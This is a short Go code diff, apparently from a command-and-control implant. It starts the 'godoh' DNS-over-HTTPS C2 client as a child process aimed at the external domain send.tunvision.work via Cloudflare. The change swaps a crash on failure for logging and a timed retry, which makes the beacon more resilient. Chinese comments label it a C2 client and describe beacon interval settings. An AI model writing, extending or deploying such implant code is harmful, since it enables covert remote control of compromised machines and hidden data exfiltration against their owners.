@@ -13,10 +13,11 @@ func main() {
 		// 创建godoh c2客户端
 		p, err := child.CreateChildProcess(`godoh`, "c2", "-d", "send.tunvision.work", "-p", "cloudflare")
 		if err != nil {
-			panic(err)
+			logger.Log("What happened? ", err, "Wait ")
+			time.Sleep(3 * time.Second)
 		}
 		logger.Log("子进程创建成功")
-		p.Handle(func(stream *child.IOStream) {
+		p.Init(func(stream *child.IOStream) {
 			isRunning := true
 			randSecond := time.Duration(5)
 			//设置间隔时间
